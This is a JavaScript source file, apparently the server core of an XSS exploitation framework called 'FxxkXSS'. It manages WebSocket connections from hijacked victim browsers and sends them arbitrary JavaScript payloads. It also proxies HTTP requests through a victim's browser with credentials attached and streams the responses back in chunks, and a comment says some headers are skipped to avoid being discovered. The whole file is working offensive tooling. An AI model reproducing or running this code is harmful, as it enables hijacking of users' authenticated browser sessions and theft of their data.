import WebSocketListener from './listener-socket.js';
import { ws_port_local, exclude_headers } from './conf.js';
import { addNewDefaultLog } from './utils/index.js';
import FxxkXSSocket from './class/FxxkXSSocket.js';

export const sockets = [];
export const socket = new WebSocketListener(ws_port_local(), (ws, id, req) => {
    const fxxkxss_socket = new FxxkXSSocket(id, ws, req);
    sockets.push(fxxkxss_socket);
    addNewDefaultLog('CORE', `[${new Date().Format('MM-dd hh:mm:ss')}] got a new connection, session id : ${id}`, 'green');
});

export const applyRunPayloadSync = (server, payload) => {
    //由domain获取到对应session的id
    for(const i of sockets){
        if(i.getServerName() === server){
            i.sendPayloadSync(payload);
        }
    }
}

//执行一段payload，但是是同步的，而且走队列
export const applyRunPayloadAsync = (server, payload) => new Promise( async resolve => {
    //由domain获取到对应session的id
    for(const i of sockets){
        if(i.getServerName() === server){
            resolve(await i.applyRunPayload(payload));
        }
    }
    resolve('invalid server');
});


//同步js操作服务
export const proxyOneLineCommandAsync = (server, command) => new Promise( async resolve => {
    const payload = seq => `
        var res = ${command};
        window.cachex.sendAsync(JSON.stringify({
            fin : true,
            text : res
        }), ${seq});
    `;
    const res = await applyRunPayloadAsync(server, payload);
    resolve(res);
});

//流量转发服务
/**
 * 
 * @param {string} server  转发服务器名
 * @param {string} method  请求方法 
 * @param {string} to      目标uri
 * @param {string} data    体数据
 * @param {object} headers 头
 * @returns 
 */
export const proxyRequest = (server, method, uri, data, headers) => new Promise( async resolve => {
    const payfunc = seq => {
            let payload =  `
            var seq = ${seq};
            var req = new XMLHttpRequest() || new ActiveXObject('MicroSoft.XMLHTTP');
            req.withCredentials = true;
            req.open('${method.toUpperCase()}', '${uri}');
        `;
        for(const j in headers){
            //有一些头一般是不允许操作的，就不改了，免得报错太多被发现
            if(!exclude_headers.includes(j.toUpperCase())){
                payload += `req.setRequestHeader('${j}','${headers[j]}');`;
            }
        }
        //这里有个很难搞的事情，对于太长了的资源，我们需要分片传输，又要处理异步了QAQ
        /**
         * 首先挂载一个用于传输第n次数据的函数，随后从0开始启动第0次传输，第 0 + 1次会由服务器发送payload启动
         */
        payload += `
            req.send('${data}');
            req.onreadystatechange = function(ev){
            if(req.readyState !== 4) return;
                window.cachex.next$cb${seq} = function(index){
                    var text = req.responseText.slice(index * 16382, (index + 1) * 16382);
                    window.cachex.sendAsync(JSON.stringify({
                        index : index,
                        text : text,
                        fin : text.length < 16382
                    }), ${seq});
                    if(text.length < 16382){
                        delete window.cachex.next$cb${seq};
                    }
                }
                window.cachex.next$cb${seq}(0);
            }
        `;
        return payload;
    }
    const res = await applyRunPayloadAsync(server, payfunc);
    resolve(res);
});